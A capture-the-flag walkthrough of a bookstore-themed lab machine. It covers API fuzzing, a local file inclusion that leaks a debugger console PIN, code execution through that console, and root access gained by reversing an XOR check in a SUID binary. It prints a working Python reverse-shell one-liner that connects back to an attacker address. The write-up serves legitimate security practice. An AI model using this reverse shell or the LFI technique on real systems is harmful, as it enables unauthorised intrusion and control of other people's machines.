# Recon

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687936687528/03137f46-e7f8-44b4-a587-9b0630f6c9a8.png )

A standard `nmap` scan reviews that the target has 2 ports open running `http` services and a conventional ssh service port open. `nmap` script also identifies the existence of a `robots.txt` file on port 5000.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687936722984/bf3cd713-9777-4d26-9cd2-fee486cbb4ff.png )

Navigating to the file located at port 5000 notifies us of the `/api` directory.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687936746056/0ea61b34-4e3b-462e-994d-63c16280fa65.png )

Navigating to the directory we are presented with an API documentation, from the looks of it we are able to send queries to the bookstore through the API.

# Enumeration

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687937516188/9d6ad3d5-bce3-4f00-8337-ad0a8daba597.png )

It is a common courtesy to run `gobuster` when enumerating websites. The results show us that there is another interesting directory `/console`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687937534994/22b83fb1-af7f-4770-9feb-c359e02b1595.png )

While we are able to access the console, it is protected by a PIN and the hint tells us that the PIN is printed out on the `stdout` stream of the shell that runs this server.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687937718771/b2bbd27b-feb4-4e11-b98c-f75ec4b4687d.png )

With the previous information gathered, we take a detour back to the original site at port 80 and take a look at the page sources. The comment tells us that the PIN we are looking for is stored inside the `.bash_history` file of the user `sid`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687938050246/45b66c13-4909-47c9-be20-9cd2a8c61fc8.png )

Taking another look at the debugger when inspecting the original site, we spot a `.js` file. In the comment, we are told that the previous version of the API contained vulnerable parameters susceptible to [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) attacks.

# Gaining foothold

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687940618629/f9963b70-347a-4275-99eb-c4ea50ed5450.png )

Knowing that the API was vulnerable to LFI attacks, we use [wfuzz](https://medium.com/@Q2hpY2tlblB3bnk/lfi-enumeration-3bd11c6f1814) to try to look for possible parameters that might not be disclosed. However, the results review nothing that we did not already know based on the documentation discovered previously.  
`--hc 404` specifies an HTTP status code to be negated in the results. Because we will run into a lot of unsuccessful attempts with the 404 return code, we save some terminal screen estate by not cluttering it with those attempts.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687940646751/86c66e43-4d34-4a6a-89e6-500c4376993d.png )

We attempt the same fuzzing method again but for an older version number `v1` instead. This time we spot an interesting parameter `show`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687940667077/0b0aaa6a-d445-4a6e-a7dc-a91484b9bf89.png )

Following the cookie trail, we finally obtain the PIN when we query the `v1` version of the API with the parameter `?show=.bash_history`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687941147521/8cf55985-c625-481d-8371-5b0a04e40ba5.png )

The console tells us that we can execute Python expressions so we use the `subprocess` library to interact with the server. Here we can see that we are the user `sid` when we execute the `whoami` command.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1687941625066/78f99d09-c34c-4039-b9b5-d17f36a8c7f1.png )

A subsequent `ls` show us the user flag in the form of a `.txt` file, we then `cat` the file and retrieve the user flag.

Knowing we will need to further explore the target, operation within the constraints of a Python console is less than ideal. We execute a Python [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) payload so we can operate in a shell environment on our machine.

```powershell
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
# Priv Escalation

After obtaining the shell on our `nc` listener, we start the process of privilege escalation to get the root flag.

Upon further inspection using `ls -la` we see a `try-harder` ELF binary file with root execution rights.

![image](https://github.com/sudonap/sudonap.github.io/assets/56335564/a0e6bf96-c340-49fb-b97f-146d607548dc)

We use the `strings` command to investigate the binary and we spot an interesting string `/bin/bash -p` which would give us a privileged shell when executed by the binary.

![image](https://github.com/sudonap/sudonap.github.io/assets/56335564/c2f1986f-df22-47bf-9b62-073ff64f1e99)

We transfer the binary onto our local machine with `python3` and `wget` in order to further analyze it using [Ghidra](https://ghidra-sre.org/).

![image](https://github.com/sudonap/sudonap.github.io/assets/56335564/fd6ab923-73c7-4909-b949-3ccc88ea30cf)

Loading the binary in Ghidra, we navigate to the `main` function. Here we can see that the program takes in user input with the `scanf` function and evaluates it. The user input is stored as `local_1c`. The result of `local_1c` XOR `0x1116` XOR `local_18 (0x5db3)` is then evaluated against `local_14 (0x5dcd21f4)`. If true, the command that gives us a privileged shell would be executed.

![image](https://github.com/sudonap/sudonap.github.io/assets/56335564/74d0532c-b72b-4bb2-a7a1-40033943cf5b)

We rearrange the equation and use Python to calculate the "magic number".

![image](https://github.com/sudonap/sudonap.github.io/assets/56335564/82f29b28-6c19-47f4-a4a0-b2f03e95f054)

We know that the reverse of any xor operation is itself so the reverse of bitxor is bitxor. 

Indeed, when we put the result of `0x5dcd6dea` into the original xor equation, it checkes out to the value of `0x5dcd21f4` which causes the program to call `/bin/sh -p`

After we input the magic number we are now `root`. Navigate to `/root` to obtain the root flag and complete the room.

# Conclusion

I started this room to further practice web API fuzzing. I was pleasantly surprised to encounter some reverse engineering to escalate to root. I wish that it was a bit more than just a basic analysis of the decompiled code. Nonetheless, I had a lot of fun doing the room and I hope this walkthrough helps you. Feel free to correct me if I made any mistakes in my explanation.
